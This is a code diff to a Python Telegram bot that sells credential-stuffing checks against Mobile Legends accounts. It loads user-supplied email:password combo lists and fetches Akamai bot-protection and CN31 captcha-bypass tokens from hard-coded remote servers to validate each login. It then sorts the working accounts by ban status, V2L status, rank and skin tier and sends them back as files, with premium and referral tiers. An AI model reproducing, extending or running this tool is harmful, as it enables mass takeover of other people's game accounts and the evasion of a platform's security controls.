@@ -34,8 +34,8 @@ ADMIN_ID = 5674812663
 CHANNEL  = "nixzllss"
 
 API_URL      = "http://144.91.112.169:4040/check"
-AKAMAI_API   = "http://80.241.218.98:5050/api/status"
-CN31_API     = "http://144.91.112.169:7070/stats"
+AKAMAI_API   = "http://5.189.140.181:3030/api/status"
+CN31_API     = "http://5.189.140.181:8080/stats"
 
 CN31_SERVER        = "http://144.91.112.169:7070/get-token"
 ABCK_SERVER        = "http://80.241.218.98:5050"
@@ -57,6 +57,7 @@ FREE_THREADS       = 4
 FREE_BAN_DAILY     = 2
 REFERRAL_BAN_BONUS = 2
 PREMIUM_BAN_BONUS  = 10
+MAX_COMBO_LINES    = 1000
 
 PRICING_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -146,6 +147,134 @@ BINDING_MAP_SEMI = {
     "gg-and_":         "Google Play",
     "gg-ios_":         "Google Play",
 }
+
+EMAIL_DOMAINS_BOT = (
+    "@gmail.", "@googlemail.",
+    "@yahoo.", "@ymail.", "@rocketmail.",
+    "@hotmail.", "@outlook.", "@live.", "@msn.",
+    "@icloud.", "@me.", "@mac.",
+    "@aol.",
+    "@proton.", "@protonmail.",
+    "@gmx.", "@gmxmail.",
+    "@zoho.",
+    "@yandex.",
+    "@mail.", "@inbox.", "@fastmail.",
+    "@tutanota.", "@tuta.",
+    "@qq.", "@163.", "@126.", "@yeah.",
+    "@sina.", "@sohu.",
+    "@naver.", "@daum.", "@hanmail.",
+    "@rediffmail.",
+    "@web.",
+    "@laposte.",
+    "@libero.",
+    "@virgilio.",
+    "@orange.",
+    "@wanadoo.",
+    "@free.",
+    "@btinternet.",
+    "@sky.",
+    "@talktalk.",
+    "@virginmedia.",
+    "@cox.",
+    "@comcast.",
+    "@verizon.",
+    "@att.",
+    "@bellsouth.",
+    "@charter.",
+    "@shaw.",
+    "@rogers.",
+    "@telus.",
+    "@mail.ru",
+    "@bk.ru",
+    "@list.ru",
+    "@inbox.ru",
+    "@edu.",
+    "@ac.",
+    "@gov.",
+    "@govt.",
+    "@mil.",
+    "@army.",
+    "@navy.",
+    "@airforce.",
+    "@police.",
+    "@org.",
+    "@net.",
+    "@com.",
+    "@co.",
+    "@int.",
+    "@biz.",
+    "@info.",
+    "@name.",
+    "@mobi.",
+    "@travel.",
+    "@museum.",
+    "@jobs.",
+    "@asia.",
+    "@eu.",
+    "@us.",
+    "@uk.",
+    "@ca.",
+    "@au.",
+    "@nz.",
+    "@jp.",
+    "@kr.",
+    "@cn.",
+    "@hk.",
+    "@tw.",
+    "@sg.",
+    "@my.",
+    "@id.",
+    "@th.",
+    "@vn.",
+    "@ph.",
+    "@in.",
+    "@pk.",
+    "@bd.",
+    "@lk.",
+    "@ae.",
+    "@sa.",
+    "@qa.",
+    "@om.",
+    "@kw.",
+    "@bh.",
+    "@za.",
+    "@ng.",
+    "@ke.",
+    "@eg.",
+    "@de.",
+    "@fr.",
+    "@it.",
+    "@es.",
+    "@pt.",
+    "@nl.",
+    "@be.",
+    "@ch.",
+    "@at.",
+    "@se.",
+    "@no.",
+    "@dk.",
+    "@fi.",
+    "@pl.",
+    "@cz.",
+    "@sk.",
+    "@hu.",
+    "@ro.",
+    "@bg.",
+    "@gr.",
+    "@tr.",
+    "@ru.",
+    "@ua.",
+    "@br.",
+    "@ar.",
+    "@cl.",
+    "@co.",
+    "@mx.",
+    "@pe.",
+)
+
+def is_email_account(login):
+    lo = login.lower()
+    return any(d in lo for d in EMAIL_DOMAINS_BOT)
 
 def md5(text):
     return hashlib.md5(text.encode()).hexdigest()
@@ -1027,45 +1156,71 @@ def build_final_summary(st_obj, stopped=False):
     nb  = v - b
     ch  = st_obj["checked"]
     t   = st_obj["total"]
+    von = st_obj.get("v2l_on",  0)
+    vof = st_obj.get("v2l_off", 0)
+    emp = st_obj.get("empass",  0)
+    usp = st_obj.get("userpass",0)
+
     elapsed = time.time() - st_obj["start_time"]
     h = int(elapsed // 3600)
     m = int((elapsed % 3600) // 60)
     s = int(elapsed % 60)
     elapsed_str = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
-    sep = "━━━━━━━━━━━━━━━━━━━━━━━━"
-    status_line = "⏹ STOPPED" if stopped else "✅ COMPLETE"
-    msg = f"{sep}\n  <b>FINAL RESULTS — {status_line}</b>\n{sep}\n\n"
-    msg += f"<b>CHECKED:</b>  {ch} / {t}\n"
-    msg += f"<b>VALID:</b>    {v}\n"
-    msg += f"<b>INVALID:</b>  {iv}\n"
-    msg += f"<b>ERRORS:</b>   {er}\n"
-    msg += f"<b>BANNED:</b>   {b}\n"
-    msg += f"<b>NOT BANNED:</b> {nb}\n"
-    msg += f"<b>TIME:</b>     {elapsed_str}\n"
+    rate = ch / elapsed if elapsed > 0 else 0
+
+    def bar(count, total):
+        if total == 0:
+            return "░" * 20
+        filled = int((count / total) * 20)
+        return "█" * filled + "░" * (20 - filled)
+
+    sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+    sep2 = "────────────────────────"
+    status = "STOPPED" if stopped else "COMPLETE"
+
+    msg  = f"{sep}\n  <b>FINAL RESULTS — {status}</b>\n{sep}\n\n"
+    msg += f"<b>Checked</b>   {ch} / {t}\n\n"
+    msg += f"{sep2}\n"
+    msg += f"<b>Valid</b>    <code>{bar(v,  max(ch,1))}</code>  {v}\n"
+    msg += f"<b>Invalid</b>  <code>{bar(iv, max(ch,1))}</code>  {iv}\n"
+    msg += f"<b>Banned</b>   <code>{bar(b,  max(v,1))}</code>  {b}\n"
+    msg += f"<b>V2L On</b>   <code>{bar(von,max(v,1))}</code>  {von}\n"
+    msg += f"<b>V2L Off</b>  <code>{bar(vof,max(v,1))}</code>  {vof}\n"
+    msg += f"<b>Errors</b>   <code>{bar(er, max(ch,1))}</code>  {er}\n"
+    msg += f"{sep2}\n"
+    msg += f"<b>EmailPass</b>  <code>{bar(emp,max(v,1))}</code>  {emp}\n"
+    msg += f"<b>UserPass</b>   <code>{bar(usp,max(v,1))}</code>  {usp}\n"
+    msg += f"{sep2}\n"
+    msg += f"<b>Time</b>    {elapsed_str}\n"
+    msg += f"<b>Rate</b>    {rate:.2f} acc/s\n"
+
     top_accounts = st_obj.get("top_accounts", [])
     if top_accounts:
-        msg += f"\n<b>TOP 3 HIGHEST LEVEL:</b>\n"
+        msg += f"\n{sep2}\n<b>TOP ACCOUNTS</b>\n"
         for i, acc in enumerate(top_accounts[:3], 1):
             msg += f"  {i}. {acc['ign']} — Lv.{acc['level']} | {acc['rank']} | {acc['country']}\n"
+
+    collector_stats = st_obj.get("collector_stats", {})
+    collector_order = ["World","Mega","Exalted","Renowned","Collector","Epic","Special","Elite","Rare","Normal"]
+    col_lines = ""
+    for sk in collector_order:
+        cnt = collector_stats.get(sk, 0)
+        if cnt > 0:
+            col_lines += f"  {sk}: {cnt}\n"
+    if col_lines:
+        msg += f"\n{sep2}\n<b>COLLECTOR TIER</b>\n{col_lines}"
+
     rank_counts = st_obj.get("rank_counts", {})
-    rank_order  = ["Mythic", "Legend", "Epic", "Grandmaster", "Master", "Elite", "Warrior", "Unknown Rank"]
+    rank_order  = ["Mythic","Legend","Epic","Grandmaster","Master","Elite","Warrior"]
     rank_lines  = ""
     for rk in rank_order:
         cnt = rank_counts.get(rk, 0)
         if cnt > 0:
             rank_lines += f"  {rk}: {cnt}\n"
     if rank_lines:
-        msg += f"\n<b>RANK BREAKDOWN:</b>\n{rank_lines}"
-    collector_stats = st_obj.get("collector_stats", {})
-    skin_order = ["World", "Mega", "Exalted", "Renowned", "Collector", "Epic", "Special", "Elite", "Rare", "Normal", "Starlight", "Squad", "Misc"]
-    skin_lines = ""
-    for sk in skin_order:
-        cnt = collector_stats.get(sk, 0)
-        if cnt > 0:
-            skin_lines += f"  {sk}: {cnt}\n"
-    if skin_lines:
-        msg += f"\n<b>SKIN TIER COUNT:</b>\n{skin_lines}"
-    msg += f"\n<b>Powered by @nixzlls</b>"
+        msg += f"\n{sep2}\n<b>RANK BREAKDOWN</b>\n{rank_lines}"
+
+    msg += f"\n{sep}\n<b>Powered by @nixzlls</b>"
     return msg
 
 
@@ -1077,48 +1232,74 @@ def build_stats_msg(st_obj):
     nb  = v - b
     ch  = st_obj["checked"]
     t   = st_obj["total"]
+    von = st_obj.get("v2l_on", 0)
+    vof = st_obj.get("v2l_off", 0)
+    emp = st_obj.get("empass", 0)
+    usp = st_obj.get("userpass", 0)
+
     elapsed = time.time() - st_obj["start_time"]
+    rate    = ch / elapsed if elapsed > 0 else 0
+    eta     = (t - ch) / rate if rate > 0 and ch < t else 0
     h = int(elapsed // 3600)
     m = int((elapsed % 3600) // 60)
     s = int(elapsed % 60)
     elapsed_str = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
+    eta_str = f"{int(eta//60)}m {int(eta%60)}s"
 
     pct    = (ch / t * 100) if t > 0 else 0
     filled = int(20 * pct / 100)
     bar    = "█" * filled + "░" * (20 - filled)
 
-    rank_counts     = st_obj.get("rank_counts", {})
+    def mb(count, denom):
+        if denom == 0:
+            return "░" * 14
+        w  = 14
+        f2 = int((count / denom) * w)
+        return "█" * f2 + "░" * (w - f2)
+
+    sep   = "────────────────────────"
+    sep2  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+    done  = ch >= t
+
+    msg  = f"{sep2}\n  <b>LIVE STATS</b>\n{sep2}\n\n"
+    msg += f"<b>Progress</b>  <code>{bar}</code>  {pct:.1f}%  {ch}/{t}\n\n"
+    msg += f"{sep}\n"
+    msg += f"<b>Valid</b>    <code>{mb(v,  max(ch,1))}</code>  {v}\n"
+    msg += f"<b>Invalid</b>  <code>{mb(iv, max(ch,1))}</code>  {iv}\n"
+    msg += f"<b>Banned</b>   <code>{mb(b,  max(v,1))}</code>  {b}\n"
+    msg += f"<b>V2L On</b>   <code>{mb(von,max(v,1))}</code>  {von}\n"
+    msg += f"<b>V2L Off</b>  <code>{mb(vof,max(v,1))}</code>  {vof}\n"
+    msg += f"<b>Errors</b>   <code>{mb(er, max(ch,1))}</code>  {er}\n"
+    msg += f"{sep}\n"
+    msg += f"<b>Combo Type</b>\n"
+    msg += f"  EmailPass  <code>{mb(emp,max(v,1))}</code>  {emp}\n"
+    msg += f"  UserPass   <code>{mb(usp,max(v,1))}</code>  {usp}\n"
+    msg += f"{sep}\n"
+    msg += f"<b>Rate</b>     {rate:.2f} acc/s\n"
+    msg += f"<b>ETA</b>      {eta_str}\n"
+    msg += f"<b>Elapsed</b>  {elapsed_str}\n"
+
     collector_stats = st_obj.get("collector_stats", {})
-
-    rank_order = ["Mythic", "Legend", "Epic", "Grandmaster", "Master", "Elite", "Warrior", "Unknown Rank"]
-    rank_lines = ""
-    for rk in rank_order:
-        cnt = rank_counts.get(rk, 0)
-        if cnt > 0:
-            rank_lines += f"  {rk}: {cnt}\n"
-
-    collector_order = ["World", "Mega", "Exalted", "Renowned", "Collector", "Epic", "Special", "Elite", "Rare"]
+    collector_order = ["World","Mega","Exalted","Renowned","Collector","Epic","Special","Elite","Rare","Normal"]
     col_lines = ""
     for ct in collector_order:
         cnt = collector_stats.get(ct, 0)
         if cnt > 0:
             col_lines += f"  {ct}: {cnt}\n"
-
-    sep  = "────────────────────────"
-    msg  = f"{sep}\n  <b>ʟɪᴠᴇ sᴛᴀᴛs</b>\n{sep}\n\n"
-    msg += f"{bar} {pct:.1f}%\n\n"
-    msg += f"ᴛᴏᴛᴀʟ: {t}  ᴄʜᴇᴄᴋᴇᴅ: {ch}/{t}\n"
-    msg += f"ᴠᴀʟɪᴅ: {v}   ʙᴀɴɴᴇᴅ: {b}   ɴᴏᴛ: {nb}\n"
-    msg += f"ɪɴᴠᴀʟɪᴅ: {iv}  ᴇʀʀᴏʀ: {er}\n"
-    msg += f"ᴇʟᴀᴘsᴇᴅ: {elapsed_str}\n"
-
-    if rank_lines:
-        msg += f"\nʀᴀɴᴋ:\n{rank_lines}"
     if col_lines:
-        msg += f"\nsᴋɪɴ ᴛɪᴇʀ:\n{col_lines}"
+        msg += f"{sep}\n<b>Collector Tier</b>\n{col_lines}"
 
-    done = ch >= t
-    msg += "\nᴄʜᴇᴄᴋɪɴɢ..." if not done else "\n ᴄᴏᴍᴘʟᴇᴛᴇ"
+    rank_counts = st_obj.get("rank_counts", {})
+    rank_order  = ["Mythic","Legend","Epic","Grandmaster","Master","Elite","Warrior"]
+    rank_lines  = ""
+    for rk in rank_order:
+        cnt = rank_counts.get(rk, 0)
+        if cnt > 0:
+            rank_lines += f"  {rk}: {cnt}\n"
+    if rank_lines:
+        msg += f"{sep}\n<b>Rank</b>\n{rank_lines}"
+
+    msg += f"\n{'checking...' if not done else 'complete'}"
     return msg
 
 def update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level):
@@ -1137,7 +1318,32 @@ def update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, l
             major = collector_tier.split(" V")[0].split(" IV")[0].split(" III")[0].split(" II")[0].split(" I")[0].rstrip()
             st_obj["collector_stats"][major] = st_obj["collector_stats"].get(major, 0) + 1
 
-def fetch_akamai_stock():
+def fetch_stock_summary():
+    ak_pool = "N/A"
+    cn_pool = "N/A"
+    ak_ok   = False
+    cn_ok   = False
+    try:
+        r = requests.get(AKAMAI_API, timeout=8)
+        d = r.json()
+        ak_pool = d.get("pool_size", "N/A")
+        try:
+            ak_ok = int(ak_pool) > 0
+        except Exception:
+            ak_ok = str(ak_pool) not in ("0", "N/A", "")
+    except Exception:
+        pass
+    try:
+        r2 = requests.get(CN31_API, timeout=8)
+        d2 = r2.json()
+        cn_pool = d2.get("pool_size", "N/A")
+        try:
+            cn_ok = int(cn_pool) > 0
+        except Exception:
+            cn_ok = str(cn_pool) not in ("0", "N/A", "")
+    except Exception:
+        pass
+    return ak_pool, cn_pool, ak_ok, cn_ok
     try:
         r = requests.get(AKAMAI_API, timeout=10)
         d = r.json()
@@ -1166,9 +1372,8 @@ def build_akamai_msg():
     sep     = "────────────────────────"
     now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     msg  = f"{sep}\n  <b>AKAMAI STOCK</b>\n{sep}\n\n"
-    msg += f"Main Server\n"
     msg += f"  Stock: {ak_pool}\n"
-    msg += f"  Served: {ak_served} | Requests: {ak_served}\n"
+    msg += f"  Served: {ak_served}\n"
     msg += f"  Rate: {ak_rate}/min\n"
     msg += f"  Uptime: {ak_uptime} min\n"
     msg += f"  Last Served: {now_str}\n"
@@ -1179,9 +1384,9 @@ def build_cn31_msg():
     sep     = "────────────────────────"
     now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     msg  = f"{sep}\n  <b>CN31 STOCK</b>\n{sep}\n\n"
-    msg += f"CN31 Server\n"
     msg += f"  Stock: {cn_pool}\n"
-    msg += f"  Served: {cn_served} | Generated: {cn_gen}\n"
+    msg += f"  Served: {cn_served}\n"
+    msg += f"  Generated: {cn_gen}\n"
     msg += f"  Workers: {cn_workers}\n"
     msg += f"  Last Served: {now_str}\n"
     return msg
@@ -1221,6 +1426,7 @@ def main_menu_keyboard(uid=None, db=None):
         ],
         [
             InlineKeyboardButton("[ ANNOUNCEMENTS ]", callback_data="announcements"),
+            InlineKeyboardButton("[ HOW IT WORKS ]",  callback_data="how_it_works"),
         ],
     ]
     if uid == ADMIN_ID:
@@ -1231,7 +1437,7 @@ def main_menu_keyboard(uid=None, db=None):
 def admin_menu_keyboard():
     keyboard = [
         [
-            InlineKeyboardButton("All Users", callback_data="admin_users"),
+            InlineKeyboardButton("All Users", callback_data="admin_users_page_0"),
             InlineKeyboardButton("Premium Users", callback_data="admin_premium"),
         ],
         [
@@ -1302,18 +1508,29 @@ def check_single_thread(login, password, uid, chat_id, context, st_obj, app_loop
         gd                = data.get("game_data", {})
         current_rank_game = gd.get("current_rank", "")
         display_rank      = current_rank_game if current_rank_game else data.get("rank", "?")
-        high_rank_game    = gd.get("high_rank", "")
         collector_tier    = gd.get("collector_tier", "N/A")
         region            = data.get("region", "?")
         name              = data.get("name", "?")
         level             = data.get("level", "?")
+        v2l_status        = gd.get("v2l_status", "") or ""
+        v2l_active        = str(v2l_status).strip().upper() not in ("", "N/A", "NONE", "FALSE", "0", "NO", "NOT ELIGIBLE", "INELIGIBLE")
         is_actually_banned = banned and not ban_expired
+        is_email = is_email_account(login)
 
         with lock:
             st_obj["valid"]   += 1
             st_obj["checked"] += 1
             if is_actually_banned:
                 st_obj["banned"] += 1
+            if not is_actually_banned:
+                if v2l_active:
+                    st_obj["v2l_on"]  = st_obj.get("v2l_on", 0) + 1
+                else:
+                    st_obj["v2l_off"] = st_obj.get("v2l_off", 0) + 1
+            if is_email:
+                st_obj["empass"]   = st_obj.get("empass", 0) + 1
+            else:
+                st_obj["userpass"] = st_obj.get("userpass", 0) + 1
 
         update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level)
 
@@ -1321,8 +1538,12 @@ def check_single_thread(login, password, uid, chat_id, context, st_obj, app_loop
         with lock:
             if is_actually_banned:
                 st_obj.setdefault("ban_lines", []).append(plain_text)
+            elif v2l_active:
+                st_obj.setdefault("v2l_on_lines",  []).append(plain_text)
+                st_obj.setdefault("valid_lines",    []).append(plain_text)
             else:
-                st_obj.setdefault("valid_lines", []).append(plain_text)
+                st_obj.setdefault("v2l_off_lines", []).append(plain_text)
+                st_obj.setdefault("valid_lines",   []).append(plain_text)
 
     elif status == "invalid":
         with lock:
@@ -1468,6 +1689,37 @@ def run_check_job(uid, chat_id, combos, context, st_obj, app_loop, num_threads, 
                 app_loop
             )
 
+        v2l_on_lines  = st_obj.get("v2l_on_lines", [])
+        v2l_off_lines = st_obj.get("v2l_off_lines", [])
+
+        if v2l_on_lines:
+            vob   = "\n\n".join(v2l_on_lines).encode("utf-8")
+            vobuf = io.BytesIO(vob)
+            vobuf.name = "v2l_on.txt"
+            asyncio.run_coroutine_threadsafe(
+                context.bot.send_document(
+                    chat_id=chat_id,
+                    document=vobuf,
+                    caption=f"<b>V2L ON — NOT BANNED</b> | {len(v2l_on_lines)} account(s)",
+                    parse_mode="HTML"
+                ),
+                app_loop
+            )
+
+        if v2l_off_lines:
+            vfb   = "\n\n".join(v2l_off_lines).encode("utf-8")
+            vfbuf = io.BytesIO(vfb)
+            vfbuf.name = "v2l_off.txt"
+            asyncio.run_coroutine_threadsafe(
+                context.bot.send_document(
+                    chat_id=chat_id,
+                    document=vfbuf,
+                    caption=f"<b>V2L OFF — NOT BANNED</b> | {len(v2l_off_lines)} account(s)",
+                    parse_mode="HTML"
+                ),
+                app_loop
+            )
+
     summary = build_final_summary(st_obj, stopped=stopped)
 
     with data_lock:
@@ -1549,18 +1801,25 @@ async def is_member(bot, uid):
 def join_keyboard():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("[ JOIN CHANNEL ]", url=f"https://t.me/{CHANNEL}")],
-        [InlineKeyboardButton("[ I ALREADY JOINED ✓ ]", callback_data="verify_join")],
+        [InlineKeyboardButton("[ VERIFY MEMBERSHIP ]", callback_data="verify_join")],
     ])
 
 async def send_join_prompt(target, context):
+    sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+    sep2 = "────────────────────────"
     text = (
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "  <b>JOIN REQUIRED</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "  You must join our channel to use this bot.\n\n"
+        f"{sep}\n"
+        f"  <b>ACCESS RESTRICTED</b>\n"
+        f"{sep}\n\n"
+        f"  This bot is exclusive to members\n"
+        f"  of our official channel.\n\n"
+        f"{sep2}\n\n"
         f"  Channel: <b>@{CHANNEL}</b>\n\n"
-        "  1. Click <b>[ JOIN CHANNEL ]</b>\n"
-        "  2. Click <b>[ I ALREADY JOINED ✓ ]</b>"
+        f"  STEP 1  Join the channel below\n"
+        f"  STEP 2  Click Verify Membership\n\n"
+        f"{sep2}\n\n"
+        f"  Once verified you will have\n"
+        f"  full access to all bot features."
     )
     if hasattr(target, "edit_message_text"):
         await target.edit_message_text(text, parse_mode="HTML", reply_markup=join_keyboard())
@@ -1602,16 +1861,31 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     referrer["ban_checks_remaining"] = referrer.get("ban_checks_remaining", FREE_BAN_DAILY) + REFERRAL_BAN_BONUS
                     user["referral_points"]     = user.get("referral_points", 0) + REFERRAL_BONUS
                     user["ban_checks_remaining"] = user.get("ban_checks_remaining", FREE_BAN_DAILY) + REFERRAL_BAN_BONUS
-                    ref_applied_msg = f"\n\n Referral applied! You got +{REFERRAL_BONUS} free checks & +{REFERRAL_BAN_BONUS} ban checks."
-                    ref_name  = uname or fname or f"User{uid}"
-                    total_pts = referrer.get("free_checks_remaining", 0) + referrer.get("referral_points", 0)
+                    ref_applied_msg = (
+                        f"\n\nReferral applied!\n"
+                        f"+{REFERRAL_BONUS} free checks\n"
+                        f"+{REFERRAL_BAN_BONUS} ban checks\n"
+                        f"+{PREMIUM_BAN_BONUS} bulk check lines"
+                    )
+                    ref_name     = uname or fname or f"User{uid}"
+                    ref_display  = f"@{ref_name}" if ref_name else f"User {uid}"
+                    total_pts    = referrer.get("free_checks_remaining", 0) + referrer.get("referral_points", 0)
+                    sep_r        = "━━━━━━━━━━━━━━━━━━━━━━━━"
+                    sep2_r       = "────────────────────────"
                     asyncio.ensure_future(context.bot.send_message(
                         chat_id=int(referrer_uid),
                         text=(
-                            f" <b>Referral Used!</b>\n\n"
-                            f"@{ref_name} used your referral link!\n"
-                            f" You got <b>+{REFERRAL_BONUS} free checks</b> & <b>+{REFERRAL_BAN_BONUS} ban checks</b>\n"
-                            f" Total free checks: <b>{total_pts}</b>"
+                            f"{sep_r}\n"
+                            f"  <b>REFERRAL USED</b>\n"
+                            f"{sep_r}\n\n"
+                            f"  {ref_display} used your referral link!\n\n"
+                            f"{sep2_r}\n"
+                            f"  <b>+{REFERRAL_BONUS}</b> free checks\n"
+                            f"  <b>+{REFERRAL_BAN_BONUS}</b> ban checks\n"
+                            f"  <b>+{PREMIUM_BAN_BONUS}</b> bulk check lines\n"
+                            f"{sep2_r}\n\n"
+                            f"  Total free checks: <b>{total_pts}</b>\n"
+                            f"  Total referrals:   <b>{referrer['referral_count']}</b>"
                         ),
                         parse_mode="HTML"
                     ))
@@ -1640,18 +1914,18 @@ def do_ban_check(user_input, pw):
         d = r.json()
         abck = d.get("token") or d.get("abck") or d.get("_abck") or d.get("value") or d.get("data") or ""
         if not abck:
-            return None, "Failed to get Akamai token"
-    except Exception as e:
-        return None, f"Akamai server error: {e}"
+            return None, "Akamai token unavailable — try again later"
+    except Exception:
+        return None, "Akamai server unreachable — try again later"
 
     try:
         r2 = requests.get(BAN_CN31_API, timeout=15)
         d2 = r2.json()
         cn31 = d2.get("token") or d2.get("cn31") or d2.get("value") or d2.get("data") or ""
         if not cn31:
-            return None, "Failed to get CN31 token"
-    except Exception as e:
-        return None, f"CN31 server error: {e}"
+            return None, "CN31 token unavailable — try again later"
+    except Exception:
+        return None, "CN31 server unreachable — try again later"
 
     p_hash = md5(pw)
     params = {
@@ -2127,6 +2401,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "checked":         0,
             "total":           total_lines,
             "banned":          0,
+            "v2l_on":          0,
+            "v2l_off":         0,
+            "empass":          0,
+            "userpass":        0,
             "start_time":      time.time(),
             "country_stats":   {},
             "rank_counts":     {},
@@ -2135,6 +2413,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "status_msg_id":   None,
             "valid_lines":     [],
             "ban_lines":       [],
+            "v2l_on_lines":    [],
+            "v2l_off_lines":   [],
             "hit_mode":        hit_mode,
         }
 
@@ -2413,6 +2693,89 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting_key"] = True
         return ConversationHandler.END
 
+    if data == "how_it_works":
+        sep_h  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+        sep2_h = "────────────────────────"
+        await query.edit_message_text(
+            f"{sep_h}\n"
+            f"  <b>HOW THE CHECKER WORKS</b>\n"
+            f"{sep_h}\n\n"
+            f"To all premium and free users —\n\n"
+            f"Please check the <b>Akamai</b> and <b>CN31</b>\n"
+            f"stock before you start checking.\n\n"
+            f"If there is no stock, your accounts\n"
+            f"will show as <b>INVALID</b> or <b>ERROR</b>.\n\n"
+            f"Do not DM the admin saying the\n"
+            f"checker is not working — it requires\n"
+            f"CN31 and Akamai stock to function.\n\n"
+            f"{sep2_h}\n\n"
+            f"  <b>STOCK USAGE</b>\n\n"
+            f"  1 CN31 token = 1 account\n"
+            f"  1 Akamai token = 5 accounts\n\n"
+            f"{sep2_h}\n\n"
+            f"  <b>IF YOU GET ERRORS</b>\n\n"
+            f"  Wait for stock to refill, then\n"
+            f"  resend your combo file.\n\n"
+            f"  Check stock using the buttons\n"
+            f"  on the main menu before checking.\n\n"
+            f"{sep_h}\n"
+            f"  Thank you for understanding.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("[ AKAMAI STOCK ]", callback_data="akamai_stock"),
+                 InlineKeyboardButton("[ CN31 STOCK ]",   callback_data="cn31_stock")],
+                [InlineKeyboardButton("[ BACK ]",         callback_data="back_main")],
+            ])
+        )
+        return ConversationHandler.END
+
+    if data == "error_guide":
+        sep_e  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+        sep2_e = "────────────────────────"
+        ak_pool, cn_pool, ak_ok, cn_ok = fetch_stock_summary()
+        ak_status = f"ONLINE — {ak_pool} stock" if ak_ok else f"LOW / OFFLINE — {ak_pool}"
+        cn_status = f"ONLINE — {cn_pool} stock" if cn_ok else f"LOW / OFFLINE — {cn_pool}"
+        await query.edit_message_text(
+            f"{sep_e}\n"
+            f"  <b>WHY AM I GETTING ERRORS?</b>\n"
+            f"{sep_e}\n\n"
+            f"This checker requires two external\n"
+            f"services to verify each account:\n\n"
+            f"{sep2_e}\n"
+            f"  <b>AKAMAI</b>\n"
+            f"  Bypasses Moonton's bot protection.\n"
+            f"  1 Akamai token = 5 accounts.\n"
+            f"  Status: {ak_status}\n\n"
+            f"  <b>CN31</b>\n"
+            f"  Required captcha bypass token.\n"
+            f"  1 CN31 token = 1 account.\n"
+            f"  Status: {cn_status}\n"
+            f"{sep2_e}\n\n"
+            f"  <b>COMMON ERRORS</b>\n\n"
+            f"  INVALID — Wrong password OR\n"
+            f"  no CN31/Akamai stock available.\n\n"
+            f"  ERROR — Server timeout or stock\n"
+            f"  ran out mid-check. Try again later.\n\n"
+            f"  LOTS OF INVALIDS — Stock is low.\n"
+            f"  Wait and recheck your combo when\n"
+            f"  servers are back online.\n\n"
+            f"{sep2_e}\n"
+            f"  <b>WHAT TO DO</b>\n\n"
+            f"  1. Check stock before sending files\n"
+            f"  2. If stock is low, wait for refill\n"
+            f"  3. Recheck returned accounts later\n"
+            f"  4. Do not DM admin for checker\n"
+            f"     issues caused by low stock\n"
+            f"{sep_e}",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("[ CHECK AKAMAI STOCK ]", callback_data="akamai_stock")],
+                [InlineKeyboardButton("[ CHECK CN31 STOCK ]",   callback_data="cn31_stock")],
+                [InlineKeyboardButton("[ BACK ]",               callback_data="back_main")],
+            ])
+        )
+        return ConversationHandler.END
+
     if data == "akamai_stock":
         await query.edit_message_text("Fetching Akamai stock...", parse_mode="HTML")
         msg = build_akamai_msg()
@@ -2502,26 +2865,76 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return ConversationHandler.END
 
-    if data == "admin_users":
+    if data == "admin_users" or data.startswith("admin_users_page_"):
         if uid != ADMIN_ID:
             return ConversationHandler.END
-        db2        = get_db()
-        users      = list(db2["users"].values())
-        total      = len(users)
-        prem_count = sum(1 for u in users if is_premium(u))
-        msg = f" <b>ALL USERS ({total})</b>\n{sep}\n\n"
-        for u in users[:20]:
-            prem_tag = "" if is_premium(u) else ""
-            uname2   = u.get("username") or u.get("first_name") or "N/A"
-            msg += (
-                f"{prem_tag} <code>{u['uid']}</code> @{uname2}\n"
-                f"   Checked: {u.get('total_checked', 0)} | Valid: {u.get('total_valid', 0)} "
-                f"| Invites: {u.get('referral_count', 0)}\n"
-            )
-        if total > 20:
-            msg += f"\n... and {total - 20} more users."
-        msg += f"\n\n Total: {total} | Premium: {prem_count} | Free: {total - prem_count}"
-        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
+        page    = int(data.split("_")[-1]) if data.startswith("admin_users_page_") else 0
+        PER     = 6
+        db2     = get_db()
+        all_u   = sorted(
+            db2["users"].values(),
+            key=lambda u: u.get("total_checked", 0),
+            reverse=True
+        )
+        total_u = len(all_u)
+        start   = page * PER
+        end     = min(start + PER, total_u)
+        chunk   = all_u[start:end]
+        sep_u   = "━━━━━━━━━━━━━━━━━━━━━━━━"
+        sep2_u  = "────────────────────────"
+        prem_count = sum(1 for u in all_u if is_premium(u))
+        lines   = [
+            f"{sep_u}",
+            f"  <b>ALL USERS</b>  {total_u} total | {prem_count} premium",
+            f"  Page {page + 1} / {((total_u - 1) // PER) + 1}",
+            f"{sep_u}",
+            ""
+        ]
+        for u in chunk:
+            prem    = is_premium(u)
+            tag     = "PREMIUM" if prem else "FREE"
+            name    = u.get("username") or u.get("first_name") or u["uid"]
+            refs    = u.get("referral_count", 0)
+            chk     = u.get("total_checked", 0)
+            val     = u.get("total_valid", 0)
+            ban_c   = u.get("ban_checks_remaining", 0)
+            ref_pts = u.get("referral_points", 0)
+            joined  = ""
+            try:
+                joined = datetime.fromisoformat(u.get("joined", "")).strftime("%m/%d/%y")
